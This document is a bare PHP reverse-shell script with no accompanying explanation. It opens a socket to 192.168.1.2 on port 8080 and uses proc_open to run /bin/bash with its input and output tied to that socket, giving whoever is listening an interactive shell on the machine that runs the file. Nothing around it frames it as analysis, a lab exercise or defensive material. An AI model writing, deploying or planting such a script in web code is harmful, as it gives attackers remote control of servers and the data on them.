<?php
$ip = "192.168.1.2";
$port = 8080;

$sock = @fsockopen($ip, $port, $errno, $errstr, 5);

if (!$sock) {
  echo "Failed to connect to $ip:$port ($errno: $errstr)\n";
  exit(1);
}

// Disable blocking and enable non-standard streams
stream_set_blocking($sock, 0);
stream_set_write_buffer($sock, 0);
stream_set_read_buffer($sock, 0);

// Open shell
$shell = "/bin/bash";
$descriptorspec = array(
  0 => $sock,
  1 => $sock,
  2 => $sock
);

$process = proc_open($shell, $descriptorspec, $pipes);

// Check if shell opened successfully
if (!$process) {
  echo "Failed to open shell\n";
  fclose($sock);
  exit(1);
}

// Wait for shell to exit
while (proc_get_status($process)['running']) {
  sleep(1);
}

// Close socket and process
fclose($sock);
proc_close($process);
?>
